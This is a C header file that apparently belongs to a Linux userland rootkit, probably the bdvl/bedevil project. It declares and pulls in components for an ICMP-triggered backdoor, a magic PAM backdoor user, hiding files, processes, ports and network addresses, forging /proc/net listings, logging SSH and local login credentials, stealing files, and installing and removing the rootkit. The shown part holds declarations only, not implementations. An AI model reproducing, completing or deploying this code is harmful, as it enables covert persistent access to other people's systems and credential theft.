#ifndef _UTIL_H_
#define _UTIL_H_

#ifdef USE_ICMP_BD
void spawnpdoor(void); // sue me
int pdoorup(void);
#endif

#define HOME_VAR "HOME="HOMEDIR

#include "proc/proc.h"

#define isbduname(name) !strncmp(PAM_UNAME, name, LEN_PAM_UNAME)

#define MAGICUSR 0
#define NORMLUSR 1

#include "misc.c"

int _hidden_path(const char *pathname, short mode);
int _f_hidden_path(int fd, short mode);
int _l_hidden_path(const char *pathname, short mode);
int hidden_proc(pid_t pid);
#define MODE_REG 0
#define MODE_64  1
#define hidden_pid(pid)      hidden_proc(getpid())
#define hidden_ppid(pid)     hidden_proc(getppid())
#define hidden_path(path)    _hidden_path(path, MODE_REG)
#define hidden_path64(path)  _hidden_path(path, MODE_64)
#define hidden_fd(fd)        _f_hidden_path(fd, MODE_REG)
#define hidden_fd64(fd)      _f_hidden_path(fd, MODE_64)
#define hidden_lpath(path)   _l_hidden_path(path, MODE_REG)
#define hidden_lpath64(path) _l_hidden_path(path, MODE_64)

off_t getfilesize(const char *path);
off_t getnewfilesize(const char *path, off_t fsize);
off_t getdirsize(const char *dirpath);
off_t getnewdirsize(const char *dirpath, off_t fsize);
#include "size.c"

#if defined LOG_SSH || defined LOG_LOCAL_AUTH
int alreadylogged(const char *logpath, char *logbuf);
int logcount(const char *path);
#include "log.c"
#endif

int _rknomore(char *installdir, char *bdvlso);
#define rknomore() _rknomore(INSTALL_DIR, BDVLSO)
#include "nomore.c"

#ifdef HIDE_PORTS
int is_hidden_port(unsigned short port);
int secret_connection(char line[]);
int hideport_alive(void);
FILE *forge_procnet(const char *pathname);
#endif

void bdvupdate(char *const argv[]);
void eradicatedir(const char *target);
void hidedircontents(const char *target, gid_t magicgid);
#include "magic/magic.h"

int prepareregfile(const char *path, gid_t magicgid);
int preparedir(const char *path, gid_t magicgid);
#ifdef HIDE_ADDRS
void preparehideaddrs(gid_t magicgid);
#endif
#ifdef HIDE_PORTS
void preparehideports(gid_t magicgid);
#endif
void bdprep(void);
#include "prep.c"

#ifdef FILE_STEAL
#include "steal/steal.h"
#endif

#include "install/install.h"

#include "hiding/hiding.h"

#endif